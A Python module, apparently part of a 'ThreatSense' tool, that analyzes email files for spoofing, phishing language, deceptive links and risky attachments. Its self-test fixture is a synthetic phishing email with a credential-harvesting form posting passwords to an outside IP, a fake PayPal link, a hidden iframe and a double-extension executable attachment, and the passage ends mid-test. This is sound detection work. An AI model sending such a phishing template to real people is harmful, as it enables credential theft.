"""
ThreatSense — Email Analyzer Module
====================================
Parses .eml / .msg email files and produces a structured findings dict
that plugs directly into Member 1's analysis pipeline.

Capabilities:
  1.  Full RFC-2822 header parsing with spoofing detection
  2.  SPF / DKIM / DMARC authentication result extraction
  3.  HTML body analysis — deceptive links, hidden iframes, form actions
  4.  Phishing language detection (urgency, credential harvesting cues)
  5.  Base64 / quoted-printable body decoding
  6.  Attachment extraction with metadata (name, type, size, hashes)
  7.  IOC extraction from headers, body text, and URLs
  8.  Comprehensive risk scoring

Usage by main.py:
    from email_analyzer import analyze_email
    result = analyze_email(file_bytes, filename)

Returns a dict matching the ThreatSense pipeline contract.
"""

import base64
import hashlib
import math
import re
import email
import email.policy
import email.utils
import quopri
from collections import Counter
from datetime import datetime, timezone
from email import message_from_bytes
from html.parser import HTMLParser
from io import BytesIO
from typing import Any

# ---------------------------------------------------------------------------
#  Constants
# ---------------------------------------------------------------------------

# Known suspicious / disposable email domains
SUSPICIOUS_SENDER_DOMAINS = {
    "tempmail.com", "guerrillamail.com", "throwaway.email", "yopmail.com",
    "mailinator.com", "sharklasers.com", "guerrillamailblock.com",
    "grr.la", "dispostable.com", "trashmail.com", "fakeinbox.com",
    "maildrop.cc", "10minutemail.com", "temp-mail.org",
}

# Phishing keyword patterns — weighted by severity
PHISHING_KEYWORDS = {
    # Urgency / fear
    "urgent":               ("Urgency language", 10),
    "immediately":          ("Urgency language", 10),
    "account suspended":    ("Account threat", 15),
    "account will be closed": ("Account threat", 15),
    "verify your account":  ("Credential harvesting", 20),
    "verify your identity": ("Credential harvesting", 20),
    "confirm your password": ("Credential harvesting", 25),
    "update your payment":  ("Financial lure", 20),
    "click here immediately": ("Urgency + click lure", 20),
    "act now":              ("Urgency language", 10),
    "limited time":         ("Urgency language", 10),
    "expire":               ("Urgency language", 8),
    "suspended":            ("Account threat", 12),
    "unusual activity":     ("Account threat", 15),
    "unauthorized access":  ("Account threat", 15),
    "reset your password":  ("Credential harvesting", 15),
    "security alert":       ("Social engineering", 12),
    "won a prize":          ("Lottery scam", 20),
    "congratulations":      ("Lottery scam", 8),
    "wire transfer":        ("Financial lure", 20),
    "invoice attached":     ("BEC lure", 15),
    "purchase order":       ("BEC lure", 12),
    "action required":      ("Urgency language", 10),
}

# Dangerous attachment extensions
DANGEROUS_EXTENSIONS = {
    ".exe", ".scr", ".bat", ".cmd", ".com", ".pif", ".vbs", ".vbe",
    ".js", ".jse", ".wsf", ".wsh", ".ps1", ".psm1", ".msi", ".msp",
    ".dll", ".cpl", ".hta", ".inf", ".reg", ".rgs", ".sct", ".shb",
    ".lnk", ".iso", ".img", ".cab", ".jar", ".docm", ".xlsm",
    ".pptm", ".dotm", ".xltm", ".potm",
}

# Suspicious X-Mailer values (known phishing kits / mass mailers)
SUSPICIOUS_MAILERS = {
    "php", "phpmailer", "swiftmailer", "king mailer", "atomic mail",
    "turbo mailer", "dark mailer", "leaf phpmailer", "sendblaster",
    "mailking", "gammadyne", "groupmail",
}

# Common legitimate domain list — to reduce false positives on IOC extraction
COMMON_BENIGN_DOMAINS = {
    "google.com", "gmail.com", "outlook.com", "microsoft.com",
    "yahoo.com", "facebook.com", "twitter.com", "linkedin.com",
    "apple.com", "amazon.com", "w3.org", "schema.org",
    "cloudflare.com", "googleapis.com", "gstatic.com",
}

# Regex patterns for IOC extraction
RE_IP = re.compile(
    r"\b(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.){3}"
    r"(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\b"
)
RE_DOMAIN = re.compile(
    r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)"
    r"+(?:com|net|org|io|ru|cn|tk|top|xyz|info|biz|cc|pw|club|"
    r"online|site|tech|space|pro|dev|app|link|click|work|win|"
    r"download|stream|gdn|racing|review|date|trade|bid|loan|"
    r"party|science|cricket|accountant|faith|zip|mov)\b",
    re.IGNORECASE,
)
RE_URL = re.compile(
    r"https?://[^\s\"'<>\)\]\}]+",
    re.IGNORECASE,
)
RE_EMAIL_ADDR = re.compile(
    r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
#  Utility helpers
# ---------------------------------------------------------------------------
def _compute_hashes(data: bytes) -> dict:
    """Compute MD5, SHA1, SHA256 for raw bytes."""
    return {
        "md5":    hashlib.md5(data).hexdigest(),
        "sha1":   hashlib.sha1(data).hexdigest(),
        "sha256": hashlib.sha256(data).hexdigest(),
    }


def _calculate_entropy(data: bytes) -> float:
    """Shannon entropy of raw bytes, 0.0–8.0."""
    if not data:
        return 0.0
    freq = Counter(data)
    length = len(data)
    entropy = 0.0
    for count in freq.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return round(entropy, 4)


def _entropy_verdict(entropy: float) -> str:
    if entropy < 3.5:
        return "Low — likely plain text or simple markup"
    if entropy < 6.0:
        return "Normal — typical document or email content"
    if entropy < 7.2:
        return "Elevated — possibly compressed or encoded content"
    if entropy < 7.8:
        return "HIGH — likely encrypted or packed content"
    return "CRITICAL — almost certainly encrypted payload"


def _extract_ips(text: str) -> list:
    """Extract IP addresses, filtering out common false positives."""
    raw = set(RE_IP.findall(text))
    filtered = set()
    for ip in raw:
        octets = ip.split(".")
        # Skip broadcast, loopback, link-local meta
        if ip.startswith("0.") or ip.startswith("127."):
            continue
        if ip.startswith("255.") or ip == "0.0.0.0":
            continue
        # Skip version-number-like strings (e.g. 1.0.0.0)
        if all(o == "0" for o in octets[1:]):
            continue
        filtered.add(ip)
    return sorted(filtered)


def _extract_domains(text: str) -> list:
    """Extract domains, filtering out common benign ones."""
    raw = set(RE_DOMAIN.findall(text))
    return sorted(d for d in raw if d.lower() not in COMMON_BENIGN_DOMAINS)


def _extract_urls(text: str) -> list:
    """Extract URLs from text."""
    raw = set(RE_URL.findall(text))
    # Clean trailing punctuation
    cleaned = set()
    for url in raw:
        url = url.rstrip(".,;:!?)>]}'\"")
        if len(url) > 10:
            cleaned.add(url)
    return sorted(cleaned)


def _extract_email_addresses(text: str) -> list:
    """Extract email addresses from text."""
    return sorted(set(RE_EMAIL_ADDR.findall(text)))


def _is_private_ip(ip: str) -> bool:
    """Check if an IP is RFC-1918 private."""
    return (
        ip.startswith("10.")
        or ip.startswith("192.168.")
        or re.match(r"^172\.(1[6-9]|2\d|3[01])\.", ip) is not None
    )


# ---------------------------------------------------------------------------
#  HTML link extractor — finds deceptive links
# ---------------------------------------------------------------------------
class _LinkExtractor(HTMLParser):
    """Extracts <a href>, <form action>, <iframe src>, <img src> from HTML."""

    def __init__(self):
        super().__init__()
        self.links: list[dict] = []
        self.forms: list[str] = []
        self.iframes: list[str] = []
        self.images: list[str] = []
        self._current_href: str | None = None
        self._current_display: list[str] = []
        self._in_a = False

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "a":
            self._in_a = True
            self._current_href = attrs_dict.get("href", "")
            self._current_display = []
        elif tag == "form":
            action = attrs_dict.get("action", "")
            if action:
                self.forms.append(action)
        elif tag == "iframe":
            src = attrs_dict.get("src", "")
            if src:
                self.iframes.append(src)
        elif tag == "img":
            src = attrs_dict.get("src", "")
            if src and src.startswith("http"):
                self.images.append(src)

    def handle_data(self, data):
        if self._in_a:
            self._current_display.append(data.strip())

    def handle_endtag(self, tag):
        if tag == "a" and self._in_a:
            display = " ".join(self._current_display).strip()
            self.links.append({
                "href": self._current_href or "",
                "display_text": display,
            })
            self._in_a = False
            self._current_href = None
            self._current_display = []


def _analyze_html_body(html: str) -> dict:
    """
    Parse HTML email body for deceptive links, hidden iframes, form actions.
    Returns a dict of findings.
    """
    extractor = _LinkExtractor()
    try:
        extractor.feed(html)
    except Exception:
        pass

    deceptive_links = []
    for link in extractor.links:
        href = link["href"].lower().strip()
        display = link["display_text"].lower().strip()
        if not href or not display:
            continue

        # Deceptive link: display text looks like a URL but points elsewhere
        if (
            display.startswith("http")
            and href.startswith("http")
            and _get_domain(display) != _get_domain(href)
        ):
            deceptive_links.append({
                "display_text": link["display_text"],
                "actual_url": link["href"],
                "finding": "Display text shows one domain but link points to a different domain",
                "severity": "HIGH",
            })

        # Deceptive link: display looks like a well-known brand
        brand_keywords = ["paypal", "microsoft", "apple", "google", "amazon", "bank", "netflix"]
        for brand in brand_keywords:
            if brand in display and brand not in href:
                deceptive_links.append({
                    "display_text": link["display_text"],
                    "actual_url": link["href"],
                    "finding": f"Link displays '{brand}' branding but points to unrelated domain",
                    "severity": "HIGH",
                })
                break

    # Extract all URLs from links for IOC purposes
    all_link_urls = [l["href"] for l in extractor.links if l["href"].startswith("http")]

    return {
        "deceptive_links": deceptive_links,
        "form_actions": extractor.forms,
        "iframes": extractor.iframes,
        "tracking_pixels": [
            img for img in extractor.images
            if "track" in img.lower() or "pixel" in img.lower()
            or "beacon" in img.lower() or img.endswith("1x1")
        ],
        "all_urls": all_link_urls,
        "total_links": len(extractor.links),
    }


def _get_domain(url: str) -> str:
    """Extract domain from a URL string."""
    url = url.lower().strip()
    if "://" in url:
        url = url.split("://", 1)[1]
    url = url.split("/", 1)[0]
    url = url.split("?", 1)[0]
    url = url.split(":", 1)[0]  # strip port
    return url


# ---------------------------------------------------------------------------
#  Header analysis
# ---------------------------------------------------------------------------
def _analyze_headers(msg: email.message.Message) -> dict:
    """
    Deep analysis of email headers for spoofing, authentication failures,
    and suspicious patterns.
    """
    findings = {
        "from": "",
        "to": "",
        "subject": "",
        "date": "",
        "reply_to": "",
        "return_path": "",
        "message_id": "",
        "x_mailer": "",
        "received_chain": [],
        "authentication": {
            "spf": "none",
            "dkim": "none",
            "dmarc": "none",
        },
        "spoofing_indicators": [],
        "suspicious_headers": [],
    }

    # --- Basic headers ---
    findings["from"] = str(msg.get("From", ""))
    findings["to"] = str(msg.get("To", ""))
    findings["subject"] = str(msg.get("Subject", ""))
    findings["date"] = str(msg.get("Date", ""))
    findings["reply_to"] = str(msg.get("Reply-To", ""))
    findings["return_path"] = str(msg.get("Return-Path", ""))
    findings["message_id"] = str(msg.get("Message-ID", ""))
    findings["x_mailer"] = str(msg.get("X-Mailer", msg.get("User-Agent", "")))

    # --- Received chain (trace the email's path) ---
    received_headers = msg.get_all("Received", [])
    for r in received_headers:
        findings["received_chain"].append(str(r).strip())

    # --- SPF / DKIM / DMARC from Authentication-Results header ---
    auth_results = str(msg.get("Authentication-Results", ""))
    if auth_results:
        auth_lower = auth_results.lower()
        # SPF
        spf_match = re.search(r"spf\s*=\s*(\w+)", auth_lower)
        if spf_match:
            findings["authentication"]["spf"] = spf_match.group(1)
        # DKIM
        dkim_match = re.search(r"dkim\s*=\s*(\w+)", auth_lower)
        if dkim_match:
            findings["authentication"]["dkim"] = dkim_match.group(1)
        # DMARC
        dmarc_match = re.search(r"dmarc\s*=\s*(\w+)", auth_lower)
        if dmarc_match:
            findings["authentication"]["dmarc"] = dmarc_match.group(1)

    # Also check standalone headers
    received_spf = str(msg.get("Received-SPF", "")).lower()
    if received_spf:
        if "pass" in received_spf:
            findings["authentication"]["spf"] = "pass"
        elif "fail" in received_spf:
            findings["authentication"]["spf"] = "fail"
        elif "softfail" in received_spf:
            findings["authentication"]["spf"] = "softfail"

    dkim_sig = msg.get("DKIM-Signature", "")
    if dkim_sig and findings["authentication"]["dkim"] == "none":
        findings["authentication"]["dkim"] = "present (result unknown)"

    # --- Spoofing detection ---
    from_addr = _extract_addr(findings["from"])
    reply_to_addr = _extract_addr(findings["reply_to"])
    return_path_addr = _extract_addr(findings["return_path"])

    from_domain = _get_email_domain(from_addr)
    reply_domain = _get_email_domain(reply_to_addr)
    return_domain = _get_email_domain(return_path_addr)

    # From ≠ Reply-To domain
    if reply_to_addr and from_domain and reply_domain:
        if from_domain.lower() != reply_domain.lower():
            findings["spoofing_indicators"].append({
                "indicator": "Reply-To domain mismatch",
                "detail": f"From domain '{from_domain}' differs from Reply-To domain '{reply_domain}'",
                "severity": "HIGH",
                "score": 20,
            })

    # From ≠ Return-Path domain
    if return_path_addr and from_domain and return_domain:
        if from_domain.lower() != return_domain.lower():
            findings["spoofing_indicators"].append({
                "indicator": "Return-Path domain mismatch",
                "detail": f"From domain '{from_domain}' differs from Return-Path domain '{return_domain}'",
                "severity": "MEDIUM",
                "score": 15,
            })

    # SPF failure
    spf_result = findings["authentication"]["spf"].lower()
    if spf_result in ("fail", "softfail"):
        findings["spoofing_indicators"].append({
            "indicator": f"SPF {spf_result}",
            "detail": "Sender's IP is not authorized to send on behalf of the claimed domain",
            "severity": "HIGH",
            "score": 25,
        })

    # DKIM failure
    dkim_result = findings["authentication"]["dkim"].lower()
    if dkim_result == "fail":
        findings["spoofing_indicators"].append({
            "indicator": "DKIM fail",
            "detail": "Email signature verification failed — message may have been tampered with",
            "severity": "HIGH",
            "score": 25,
        })

    # DMARC failure
    dmarc_result = findings["authentication"]["dmarc"].lower()
    if dmarc_result in ("fail", "none"):
        findings["spoofing_indicators"].append({
            "indicator": f"DMARC {dmarc_result}",
            "detail": "Domain alignment check failed or no DMARC policy exists",
            "severity": "MEDIUM",
            "score": 15,
        })

    # Suspicious X-Mailer
    x_mailer_lower = findings["x_mailer"].lower()
    for tool in SUSPICIOUS_MAILERS:
        if tool in x_mailer_lower:
            findings["suspicious_headers"].append({
                "header": "X-Mailer",
                "value": findings["x_mailer"],
                "finding": f"Known mass-mailing / phishing tool detected: '{tool}'",
                "score": 20,
            })
            break

    # Suspicious sender domain
    if from_domain and from_domain.lower() in SUSPICIOUS_SENDER_DOMAINS:
        findings["spoofing_indicators"].append({
            "indicator": "Disposable email domain",
            "detail": f"Sender uses known disposable/temporary email service: {from_domain}",
            "severity": "HIGH",
            "score": 20,
        })

    # Missing Message-ID (common in spoofed mail)
    if not findings["message_id"].strip() or findings["message_id"].strip() == "":
        findings["suspicious_headers"].append({
            "header": "Message-ID",
            "value": "(missing)",
            "finding": "No Message-ID header — common in spoofed or tool-generated emails",
            "score": 10,
        })

    # Empty or very short received chain (suspicious for external mail)
    if len(findings["received_chain"]) == 0:
        findings["suspicious_headers"].append({
            "header": "Received",
            "value": "(missing)",
            "finding": "No Received headers — email was likely crafted directly, not sent through a mail server",
            "score": 15,
        })

    return findings


def _extract_addr(header_value: str) -> str:
    """Extract bare email address from header like 'Name <addr@domain.com>'."""
    if not header_value:
        return ""
    # email.utils.parseaddr returns (name, addr)
    _, addr = email.utils.parseaddr(header_value)
    return addr or ""


def _get_email_domain(addr: str) -> str:
    """Get the domain part of an email address."""
    if "@" in addr:
        return addr.split("@", 1)[1].strip().lower()
    return ""


# ---------------------------------------------------------------------------
#  Attachment analysis
# ---------------------------------------------------------------------------
def _analyze_attachments(msg: email.message.Message) -> list:
    """
    Walk MIME parts and extract attachment metadata.
    Returns list of attachment dicts.
    """
    attachments = []

    for part in msg.walk():
        content_disposition = str(part.get("Content-Disposition", ""))
        filename = part.get_filename()

        # Skip non-attachment parts (inline body text/html)
        if not filename and "attachment" not in content_disposition.lower():
            continue

        if not filename:
            filename = "unnamed_attachment"

        try:
            payload = part.get_payload(decode=True)
        except Exception:
            payload = None

        if payload is None:
            payload = b""

        att_size = len(payload)
        att_hashes = _compute_hashes(payload) if payload else {"md5": "", "sha1": "", "sha256": ""}
        att_entropy = _calculate_entropy(payload) if payload else 0.0
        ext = _get_extension(filename).lower()

        is_dangerous = ext in DANGEROUS_EXTENSIONS
        content_type = part.get_content_type() or "application/octet-stream"

        # Check for extension mismatch (e.g. .pdf file with executable content-type)
        extension_mismatch = False
        if ext in (".pdf", ".doc", ".docx", ".xls", ".xlsx", ".txt"):
            if "executable" in content_type.lower() or "x-msdownload" in content_type.lower():
                extension_mismatch = True

        # Check for double extension trick (e.g. "invoice.pdf.exe")
        double_extension = False
        name_parts = filename.rsplit(".", 2) if filename else []
        if len(name_parts) >= 3:
            double_extension = True

        att_info = {
            "filename": filename,
            "content_type": content_type,
            "size_bytes": att_size,
            "hashes": att_hashes,
            "entropy": att_entropy,
            "entropy_verdict": _entropy_verdict(att_entropy),
            "extension": ext,
            "is_dangerous_extension": is_dangerous,
            "extension_mismatch": extension_mismatch,
            "double_extension": double_extension,
            "risk_flags": [],
        }

        # Build risk flags
        if is_dangerous:
            att_info["risk_flags"].append(f"Dangerous file extension: {ext}")
        if extension_mismatch:
            att_info["risk_flags"].append(
                f"Extension '{ext}' does not match content-type '{content_type}'"
            )
        if double_extension:
            att_info["risk_flags"].append(
                f"Double extension detected in '{filename}' — common evasion technique"
            )
        if att_entropy > 7.2:
            att_info["risk_flags"].append(
                f"High entropy ({att_entropy:.2f}) — attachment may be encrypted or packed"
            )

        attachments.append(att_info)

    return attachments


def _get_extension(filename: str) -> str:
    """Get file extension including the dot."""
    if "." in filename:
        return "." + filename.rsplit(".", 1)[1]
    return ""


# ---------------------------------------------------------------------------
#  Body content analysis
# ---------------------------------------------------------------------------
def _extract_body_content(msg: email.message.Message) -> dict:
    """
    Extract plain text and HTML body from the email.
    Decode base64 / quoted-printable as needed.
    """
    text_body = ""
    html_body = ""

    if msg.is_multipart():
        for part in msg.walk():
            content_type = part.get_content_type()
            content_disposition = str(part.get("Content-Disposition", ""))

            # Skip attachments
            if "attachment" in content_disposition.lower():
                continue

            try:
                payload = part.get_payload(decode=True)
                if payload is None:
                    continue
                charset = part.get_content_charset() or "utf-8"
                try:
                    decoded = payload.decode(charset, errors="replace")
                except (LookupError, UnicodeDecodeError):
                    decoded = payload.decode("utf-8", errors="replace")
            except Exception:
                continue

            if content_type == "text/plain" and not text_body:
                text_body = decoded
            elif content_type == "text/html" and not html_body:
                html_body = decoded
    else:
        try:
            payload = msg.get_payload(decode=True)
            if payload:
                charset = msg.get_content_charset() or "utf-8"
                try:
                    decoded = payload.decode(charset, errors="replace")
                except (LookupError, UnicodeDecodeError):
                    decoded = payload.decode("utf-8", errors="replace")

                if msg.get_content_type() == "text/html":
                    html_body = decoded
                else:
                    text_body = decoded
        except Exception:
            pass

    return {"text": text_body, "html": html_body}


def _strip_html(html: str) -> str:
    """Crude HTML tag stripper — gets plain text from HTML for keyword scanning."""
    text = re.sub(r"<style[^>]*>.*?</style>", "", html, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r"<script[^>]*>.*?</script>", "", text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r"<[^>]+>", " ", text)
    text = re.sub(r"\s+", " ", text)
    return text.strip()


# ---------------------------------------------------------------------------
#  Phishing analysis
# ---------------------------------------------------------------------------
def _detect_phishing(subject: str, body_text: str, html_analysis: dict) -> dict:
    """
    Score phishing likelihood from subject, body text, and HTML analysis.
    """
    combined_text = (subject + " " + body_text).lower()
    matched_keywords = []
    keyword_score = 0

    for keyword, (category, score) in PHISHING_KEYWORDS.items():
        if keyword.lower() in combined_text:
            matched_keywords.append({
                "keyword": keyword,
                "category": category,
                "score": score,
            })
            keyword_score += score

    findings = {
        "phishing_score": 0,
        "phishing_verdict": "",
        "matched_keywords": matched_keywords,
        "keyword_score": keyword_score,
        "deceptive_links": html_analysis.get("deceptive_links", []),
        "credential_harvesting_forms": [],
        "indicators": [],
    }

    # Check for credential harvesting forms
    for form_action in html_analysis.get("form_actions", []):
        if form_action.startswith("http"):
            findings["credential_harvesting_forms"].append(form_action)
            findings["indicators"].append({
                "type": "Credential harvesting form",
                "detail": f"HTML form submits data to external URL: {form_action}",
                "score": 25,
            })

    # Hidden iframes
    for iframe_src in html_analysis.get("iframes", []):
        findings["indicators"].append({
            "type": "Hidden iframe",
            "detail": f"Hidden iframe loads content from: {iframe_src}",
            "score": 20,
        })

    # Deceptive links
    for link in html_analysis.get("deceptive_links", []):
        findings["indicators"].append({
            "type": "Deceptive link",
            "detail": link.get("finding", ""),
            "score": 25,
        })

    # Calculate total phishing score
    total_score = keyword_score
    for ind in findings["indicators"]:
        total_score += ind.get("score", 0)

    # Cap at 100
    findings["phishing_score"] = min(total_score, 100)

    # Verdict
    ps = findings["phishing_score"]
    if ps >= 60:
        findings["phishing_verdict"] = "HIGH — strong phishing indicators detected"
    elif ps >= 35:
        findings["phishing_verdict"] = "MEDIUM — some phishing indicators present"
    elif ps >= 15:
        findings["phishing_verdict"] = "LOW — minor suspicious patterns"
    else:
        findings["phishing_verdict"] = "MINIMAL — no significant phishing indicators"

    return findings


# ---------------------------------------------------------------------------
#  Main public function
# ---------------------------------------------------------------------------
def analyze_email(file_bytes: bytes, filename: str = "email.eml") -> dict:
    """
    Analyze an email file (.eml) and return a structured findings dict
    compatible with the ThreatSense analysis pipeline.

    Parameters
    ----------
    file_bytes : bytes
        Raw bytes of the .eml file.
    filename : str
        Original uploaded filename.

    Returns
    -------
    dict
        Structured analysis result matching the pipeline contract.
    """
    try:
        return _analyze_email_impl(file_bytes, filename)
    except Exception as exc:
        # Never crash — return a minimal result with the error
        hashes = _compute_hashes(file_bytes) if file_bytes else {"md5": "", "sha1": "", "sha256": ""}
        entropy = _calculate_entropy(file_bytes) if file_bytes else 0.0
        return {
            "filename": filename,
            "input_type": "email",
            "file_type": "Email Message (.eml)",
            "md5": hashes["md5"],
            "sha1": hashes["sha1"],
            "sha256": hashes["sha256"],
            "size_bytes": len(file_bytes) if file_bytes else 0,
            "entropy": entropy,
            "entropy_verdict": _entropy_verdict(entropy),
            "risk_score": 0,
            "findings": {
                "error": f"Email analysis failed: {str(exc)}",
                "headers": {},
                "body_analysis": {},
                "attachments": [],
                "phishing": {},
            },
            "iocs": {
                "ips": [],
                "domains": [],
                "urls": [],
                "email_addresses": [],
                "registry_keys": [],
                "file_paths": [],
            },
        }


def _analyze_email_impl(file_bytes: bytes, filename: str) -> dict:
    """Core implementation — may raise on truly malformed input."""

    # --- Step 1: Hashes & entropy of the raw .eml file ---
    hashes = _compute_hashes(file_bytes)
    entropy = _calculate_entropy(file_bytes)
    size_bytes = len(file_bytes)

    # --- Step 2: Parse the email ---
    msg = message_from_bytes(file_bytes, policy=email.policy.default)

    # --- Step 3: Header analysis ---
    header_findings = _analyze_headers(msg)

    # --- Step 4: Body extraction & analysis ---
    body = _extract_body_content(msg)
    body_text = body["text"]
    body_html = body["html"]

    # If we only have HTML, also get a plaintext version for keyword scanning
    plain_for_scan = body_text
    if not plain_for_scan and body_html:
        plain_for_scan = _strip_html(body_html)

    # Analyze HTML body for deceptive links, forms, iframes
    html_analysis = _analyze_html_body(body_html) if body_html else {
        "deceptive_links": [],
        "form_actions": [],
        "iframes": [],
        "tracking_pixels": [],
        "all_urls": [],
        "total_links": 0,
    }

    # --- Step 5: Attachment analysis ---
    attachments = _analyze_attachments(msg)

    # --- Step 6: Phishing detection ---
    subject = header_findings.get("subject", "")
    phishing = _detect_phishing(subject, plain_for_scan, html_analysis)

    # --- Step 7: IOC extraction across all sources ---
    # Combine all text sources for IOC scanning
    all_text = " ".join([
        plain_for_scan,
        body_html or "",
        subject,
        header_findings.get("from", ""),
        header_findings.get("reply_to", ""),
        header_findings.get("return_path", ""),
        " ".join(header_findings.get("received_chain", [])),
    ])

    # Add URLs found in HTML links
    for url in html_analysis.get("all_urls", []):
        all_text += " " + url

    extracted_ips = _extract_ips(all_text)
    extracted_domains = _extract_domains(all_text)
    extracted_urls = _extract_urls(all_text)
    extracted_emails = _extract_email_addresses(all_text)

    # Also extract IPs from Received headers specifically (mail server IPs)
    received_text = " ".join(header_findings.get("received_chain", []))
    received_ips = _extract_ips(received_text)

    # Merge and deduplicate
    all_ips = sorted(set(extracted_ips + received_ips))

    iocs = {
        "ips": all_ips,
        "domains": extracted_domains,
        "urls": extracted_urls,
        "email_addresses": extracted_emails,
        "registry_keys": [],
        "file_paths": [],
    }

    # --- Step 8: Risk scoring ---
    risk_score = _calculate_risk_score(
        header_findings, phishing, attachments, html_analysis, iocs
    )

    # --- Step 9: Determine file type string ---
    file_type = "Email Message (.eml)"
    if attachments:
        dangerous_count = sum(1 for a in attachments if a.get("is_dangerous_extension"))
        if dangerous_count:
            file_type += f" — {dangerous_count} dangerous attachment(s)"

    # --- Step 10: Build the result dict ---
    findings = {
        "headers": header_findings,
        "body_analysis": {
            "has_text_body": bool(body_text),
            "has_html_body": bool(body_html),
            "html_links_count": html_analysis.get("total_links", 0),
            "deceptive_links": html_analysis.get("deceptive_links", []),
            "form_actions": html_analysis.get("form_actions", []),
            "iframes": html_analysis.get("iframes", []),
            "tracking_pixels": html_analysis.get("tracking_pixels", []),
            "body_text_preview": (plain_for_scan[:500] + "...") if len(plain_for_scan) > 500 else plain_for_scan,
        },
        "attachments": attachments,
        "attachment_count": len(attachments),
        "dangerous_attachment_count": sum(1 for a in attachments if a.get("is_dangerous_extension")),
        "phishing": phishing,
    }

    return {
        "filename": filename,
        "input_type": "email",
        "file_type": file_type,
        "md5": hashes["md5"],
        "sha1": hashes["sha1"],
        "sha256": hashes["sha256"],
        "size_bytes": size_bytes,
        "entropy": entropy,
        "entropy_verdict": _entropy_verdict(entropy),
        "risk_score": risk_score,
        "findings": findings,
        "iocs": iocs,
    }


def _calculate_risk_score(
    header_findings: dict,
    phishing: dict,
    attachments: list,
    html_analysis: dict,
    iocs: dict,
) -> int:
    """
    Composite risk score 0–100 combining all email analysis signals.
    """
    score = 0

    # Spoofing indicators
    for si in header_findings.get("spoofing_indicators", []):
        score += si.get("score", 0)

    # Suspicious headers
    for sh in header_findings.get("suspicious_headers", []):
        score += sh.get("score", 0)

    # Phishing score (already 0–100, scale down to contribute proportionally)
    score += phishing.get("phishing_score", 0) // 2

    # Dangerous attachments
    for att in attachments:
        if att.get("is_dangerous_extension"):
            score += 20
        if att.get("double_extension"):
            score += 15
        if att.get("extension_mismatch"):
            score += 15
        if att.get("entropy", 0) > 7.2:
            score += 10

    # Deceptive links
    score += len(html_analysis.get("deceptive_links", [])) * 15

    # Forms
    score += len(html_analysis.get("form_actions", [])) * 10

    # Iframes
    score += len(html_analysis.get("iframes", [])) * 10

    # IOC volume (many IPs/domains = suspicious)
    if len(iocs.get("ips", [])) > 5:
        score += 10
    if len(iocs.get("domains", [])) > 10:
        score += 10

    return min(score, 100)


# ---------------------------------------------------------------------------
#  Standalone test
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import textwrap

    # Create a synthetic .eml file for testing
    test_eml = textwrap.dedent("""\
        From: "Security Team" <security@totally-legit-bank.com>
        To: victim@company.com
        Subject: URGENT: Your Account Has Been Suspended - Action Required
        Date: Thu, 06 Mar 2026 08:00:00 +0530
        Reply-To: attacker@evil-domain.ru
        Return-Path: <bounce@phishing-server.tk>
        Message-ID: <fake-id-12345@phishing-server.tk>
        X-Mailer: PHPMailer 6.5.0
        MIME-Version: 1.0
        Content-Type: multipart/mixed; boundary="boundary123"
        Authentication-Results: mx.company.com;
            spf=fail smtp.mailfrom=phishing-server.tk;
            dkim=fail;
            dmarc=fail

        --boundary123
        Content-Type: text/html; charset="UTF-8"
        Content-Transfer-Encoding: quoted-printable

        <html>
        <body>
        <p>Dear Customer,</p>
        <p>Your account has been suspended due to unusual activity.
        You must verify your account immediately to restore access.</p>
        <p><a href="http://193.42.11.23/steal-creds/login.php">Click here to verify your account at PayPal</a></p>
        <p>If you do not act now, your account will be closed permanently.</p>
        <form action="http://193.42.11.23/harvest.php" method="POST">
        <input type="text" name="username" placeholder="Email">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Verify</button>
        </form>
        <iframe src="http://evil-tracker.ru/pixel.html" width="0" height="0"></iframe>
        </body>
        </html>

        --boundary123
        Content-Type: application/x-msdownload; name="security_update.pdf.exe"
        Content-Disposition: attachment; filename="security_update.pdf.exe"
        Content-Transfer-Encoding: base64

        TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAA
        --boundary123--
    """).encode("utf-8")

    result = analyze_email(test_eml, "suspicious_email.eml")

    # Print results
    print("=" * 70)
    print("THREATSENSE — EMAIL ANALYSIS TEST")
    print("=" * 70)
    print(f"  Filename:    {result['filename']}")
    print(f"  Input Type:  {result['input_type']}")
    print(f"  File Type:   {result['file_type']}")
    print(f"  Size:        {result['size_bytes']:,} bytes")
    print(f"  SHA256:      {result['sha256'][:32]}...")
    print(f"  Entropy:     {result['entropy']}  ({result['entropy_verdict']})")
    print(f"  Risk Score:  {result['risk_score']}/100")
    print()

    findings = result["findings"]
    headers = findings["headers"]

    print("--- HEADERS ---")
    print(f"  From:        {headers['from']}")
    print(f"  To:          {headers['to']}")
    print(f"  Subject:     {headers['subject']}")
    print(f"  Reply-To:    {headers['reply_to']}")
    print(f"  Return-Path: {headers['return_path']}")
    print(f"  X-Mailer:    {headers['x_mailer']}")
    print()

    print("--- AUTHENTICATION ---")
    auth = headers["authentication"]
    print(f"  SPF:   {auth['spf']}")
    print(f"  DKIM:  {auth['dkim']}")
    print(f"  DMARC: {auth['dmarc']}")
    print()

    print(f"--- SPOOFING INDICATORS ({len(headers['spoofing_indicators'])}) ---")
    for si in headers["spoofing_indicators"]:
        print(f"  [{si['severity']}] {si['indicator']}: {si['detail']}")
    print()

    print(f"--- SUSPICIOUS HEADERS ({len(headers['suspicious_headers'])}) ---")
    for sh in headers["suspicious_headers"]:
        print(f"  {sh['header']}: {sh['finding']}")
    print()

    print(f"--- PHISHING ANALYSIS ---")
    phishing = findings["phishing"]
    print(f"  Score:   {phishing['phishing_score']}/100")
    print(f"  Verdict: {phishing['phishing_verdict']}")
    print(f"  Keywords matched: {len(phishing['matched_keywords'])}")
    for kw in phishing["matched_keywords"][:5]:
        print(f"    • '{kw['keyword']}' ({kw['category']}, +{kw['score']})")
    if phishing["credential_harvesting_forms"]:
